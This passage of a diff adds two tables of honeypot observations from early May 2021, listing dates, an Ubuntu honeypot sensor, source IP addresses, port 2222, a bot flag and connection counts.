+| 2021-05-03   | ubuntu-18-04-lt… |     5.188.87.60 |            2222 |  1151 |
+| 2021-05-03   | ubuntu-18-04-lt… |    5.188.86.165 |            2222 |  1056 |
+| 2021-05-03   | ubuntu-18-04-lt… |     5.188.87.60 |            2222 |  1188 |
+| 2021-05-03   | ubuntu-18-04-lt… |    5.188.86.216 |            2222 |  1025 |
+| 2021-05-03   | ubuntu-18-04-lt… |     5.188.87.53 |            2222 |  1014 |
+| 2021-05-04   | ubuntu-18-04-lt… |   39.106.129.49 |            2222 |  1567 |
+| 2021-05-04   | ubuntu-18-04-lt… |    5.188.86.178 |            2222 |  1393 |
+| 2021-05-04   | ubuntu-18-04-lt… |    5.188.86.207 |            2222 |  1028 |
+| 2021-05-06   | ubuntu-18-04-lt… |     5.188.87.57 |            2222 |  1102 |
+| 2021-05-06   | ubuntu-18-04-lt… |    5.188.86.212 |            2222 |   979 |
+| 2021-05-06   | ubuntu-18-04-lt… |    5.188.86.165 |            2222 |   950 |
+| 2021-05-05   | ubuntu-18-04-lt… |     5.188.87.60 |            2222 |  1284 |
+| 2021-05-05   | ubuntu-18-04-lt… |    5.188.86.168 |            2222 |  1044 |
+| 2021-05-05   | ubuntu-18-04-lt… |    5.188.86.165 |            2222 |  1020 |
+| 2021-05-06   | ubuntu-18-04-lt… |   39.106.84.128 |            2222 |  3165 |
+| 2021-05-06   | ubuntu-18-04-lt… |    5.188.86.165 |            2222 |  1250 |
+| 2021-05-06   | ubuntu-18-04-lt… |     5.188.87.49 |            2222 |  1068 |
+| 2021-05-05   | ubuntu-18-04-lt… |   39.106.84.128 |            2222 |  3297 |
+| 2021-05-05   | ubuntu-18-04-lt… |    5.188.86.165 |            2222 |  1264 |
+| 2021-05-05   | ubuntu-18-04-lt… |    5.188.86.206 |            2222 |  1213 |
+| 2021-05-04   | ubuntu-18-04-lt… |   116.62.65.226 |            2222 |  2149 |
+| 2021-05-04   | ubuntu-18-04-lt… |    5.188.86.206 |            2222 |  1373 |
+| 2021-05-04   | ubuntu-18-04-lt… |     5.188.87.60 |            2222 |  1217 |
+| 2021-05-02   | ubuntu-18-04-lt… |    5.188.86.207 |            2222 |   486 |
+| 2021-05-02   | ubuntu-18-04-lt… |     5.188.87.57 |            2222 |   396 |
+| 2021-05-02   | ubuntu-18-04-lt… |     5.188.87.51 |            2222 |   379 |
+| 2021-05-02   | ubuntu-18-04-lt… |    5.188.86.206 |            2222 |   479 |
+| 2021-05-02   | ubuntu-18-04-lt… |     5.188.87.49 |            2222 |   454 |
+| 2021-05-02   | ubuntu-18-04-lt… |    5.188.86.165 |            2222 |   427 |
+| 2021-05-02   | ubuntu-18-04-lt… |  146.185.180.57 |            2222 |   130 |
+| 2021-05-02   | ubuntu-18-04-lt… |   206.189.18.40 |            2222 |   127 |
+| 2021-05-02   | ubuntu-18-04-lt… |  120.53.124.220 |            2222 |   123 |
+| 2021-05-01   | ubuntu-18-04-lt… |   104.131.48.26 |            2222 |   130 |
+| 2021-05-01   | ubuntu-18-04-lt… |  178.128.34.254 |            2222 |   124 |
+| 2021-05-01   | ubuntu-18-04-lt… | 134.122.124.193 |            2222 |   120 |
+| 2021-05-01   | ubuntu-18-04-lt… |  134.122.89.249 |            2222 |   120 |
+| 2021-05-01   | ubuntu-18-04-lt… |   68.183.18.128 |            2222 |   118 |
+| 2021-05-01   | ubuntu-18-04-lt… |    165.22.1.151 |            2222 |   108 |
+| 2021-05-01   | ubuntu-18-04-lt… |    42.192.157.3 |            2222 |   127 |
+| 2021-05-01   | ubuntu-18-04-lt… |    103.77.36.39 |            2222 |   126 |
+| 2021-05-01   | ubuntu-18-04-lt… |  118.193.80.106 |            2222 |   121 |
++-----------------------------------------------------------------------------+
++-----------------------------------------------------------------------------+
+| Date         | Sensor                      |      Source IP | Robot | Count |
+|--------------+-----------------------------+----------------+-------+-------|
+| 2021-05-06   | ubuntu-18-04-lts-honeypot-… |   5.188.86.216 |  True |   898 |
+| 2021-05-06   | ubuntu-18-04-lts-honeypot-… |    5.188.87.49 |  True |   871 |
+| 2021-05-06   | ubuntu-18-04-lts-honeypot-… |    5.188.87.60 |  True |   866 |
+| 2021-05-03   | ubuntu-18-04-lts-honeypot-… |   5.188.86.216 |  True |   901 |
+| 2021-05-03   | ubuntu-18-04-lts-honeypot-… |    5.188.87.49 |  True |   883 |
+| 2021-05-03   | ubuntu-18-04-lts-honeypot-… |    5.188.87.51 |  True |   793 |
+| 2021-05-05   | ubuntu-18-04-lts-honeypot-… |  116.62.65.226 |  True |  1393 |
+| 2021-05-05   | ubuntu-18-04-lts-honeypot-… |   5.188.86.165 |  True |   994 |
+| 2021-05-05   | ubuntu-18-04-lts-honeypot-… |   5.188.86.212 |  True |   801 |
+| 2021-05-04   | ubuntu-18-04-lts-honeypot-… |  39.106.84.128 | False |  1370 |
+| 2021-05-04   | ubuntu-18-04-lts-honeypot-… |   5.188.86.167 |  True |   838 |
+| 2021-05-04   | ubuntu-18-04-lts-honeypot-… |   5.188.86.206 |  True |   824 |
+| 2021-05-03   | ubuntu-18-04-lts-honeypot-… |   5.188.86.221 |  True |   843 |
+| 2021-05-03   | ubuntu-18-04-lts-honeypot-… |   5.188.86.178 |  True |   832 |
+| 2021-05-03   | ubuntu-18-04-lts-honeypot-… |    5.188.87.60 |  True |   802 |
+| 2021-05-03   | ubuntu-18-04-lts-honeypot-… |    5.188.87.53 |  True |  1014 |
+| 2021-05-03   | ubuntu-18-04-lts-honeypot-… |    5.188.87.60 |  True |   870 |
+| 2021-05-03   | ubuntu-18-04-lts-honeypot-… |    5.188.87.58 |  True |   838 |
+| 2021-05-04   | ubuntu-18-04-lts-honeypot-… |  39.106.129.49 |  True |  1567 |
+| 2021-05-04   | ubuntu-18-04-lts-honeypot-… |   5.188.86.178 |  True |   983 |
+| 2021-05-04   | ubuntu-18-04-lts-honeypot-… |    5.188.87.58 |  True |   822 |
+| 2021-05-06   | ubuntu-18-04-lts-honeypot-… |    5.188.87.57 |  True |   943 |
+| 2021-05-06   | ubuntu-18-04-lts-honeypot-… |   5.188.86.212 |  True |   833 |
+| 2021-05-06   | ubuntu-18-04-lts-honeypot-… |   5.188.86.167 |  True |   775 |
+| 2021-05-05   | ubuntu-18-04-lts-honeypot-… |    5.188.87.60 |  True |   895 |
+| 2021-05-05   | ubuntu-18-04-lts-honeypot-… |   5.188.86.167 |  True |   856 |
+| 2021-05-05   | ubuntu-18-04-lts-honeypot-… |   5.188.86.168 |  True |   762 |
+| 2021-05-06   | ubuntu-18-04-lts-honeypot-… |  39.106.84.128 | False |  3165 |
+| 2021-05-06   | ubuntu-18-04-lts-honeypot-… |   5.188.86.165 |  True |   883 |
+| 2021-05-06   | ubuntu-18-04-lts-honeypot-… |    5.188.87.51 |  True |   773 |
+| 2021-05-05   | ubuntu-18-04-lts-honeypot-… |  39.106.84.128 | False |  3297 |
+| 2021-05-05   | ubuntu-18-04-lts-honeypot-… |   5.188.86.206 |  True |   903 |
+| 2021-05-05   | ubuntu-18-04-lts-honeypot-… |    5.188.87.51 |  True |   885 |
+| 2021-05-04   | ubuntu-18-04-lts-honeypot-… |  116.62.65.226 |  True |  2141 |
+| 2021-05-04   | ubuntu-18-04-lts-honeypot-… |   5.188.86.206 |  True |   982 |
+| 2021-05-04   | ubuntu-18-04-lts-honeypot-… |    5.188.87.60 |  True |   839 |
+| 2021-05-02   | ubuntu-18-04-lts-honeypot-… |   5.188.86.207 |  True |   373 |
+| 2021-05-02   | ubuntu-18-04-lts-honeypot-… |    5.188.87.57 |  True |   329 |
+| 2021-05-02   | ubuntu-18-04-lts-honeypot-… |    5.188.87.58 |  True |   322 |
+| 2021-05-02   | ubuntu-18-04-lts-honeypot-… |    5.188.87.49 |  True |   389 |
+| 2021-05-02   | ubuntu-18-04-lts-honeypot-… |   5.188.86.206 |  True |   353 |
+| 2021-05-02   | ubuntu-18-04-lts-honeypot-… |   5.188.86.180 |  True |   307 |
+| 2021-05-02   | ubuntu-18-04-lts-honeypot-… | 146.185.180.57 |  True |   130 |
+| 2021-05-02   | ubuntu-18-04-lts-honeypot-… |  206.189.18.40 |  True |   127 |
+| 2021-05-02   | ubuntu-18-04-lts-honeypot-… |   5.188.86.212 |  True |   105 |
+| 2021-05-01   | ubuntu-18-04-lts-honeypot-… |  104.131.48.26 |  True |   130 |
+| 2021-05-01   | ubuntu-18-04-lts-honeypot-… | 178.128.34.254 |  True |   124 |
+| 2021-05-01   | ubuntu-18-04-lts-honeypot-… |   81.4.127.228 |  True |   114 |
+| 2021-05-01   | ubuntu-18-04-lts-honeypot-… | 134.122.89.249 |  True |   120 |
+| 2021-05-01   | ubuntu-18-04-lts-honeypot-… |  68.183.18.128 |  True |   110 |
+| 2021-05-01   | ubuntu-18-04-lts-honeypot-… |   165.22.1.151 |  True |   108 |
+| 2021-05-01   | ubuntu-18-04-lts-honeypot-… | 118.193.80.106 |  True |   100 |
+| 2021-05-01   | ubuntu-18-04-lts-honeypot-… |   45.119.126.7 |  True |   100 |
+| 2021-05-01   | ubuntu-18-04-lts-honeypot-… |   103.77.36.39 |  True |   100 |
++-----------------------------------------------------------------------------+
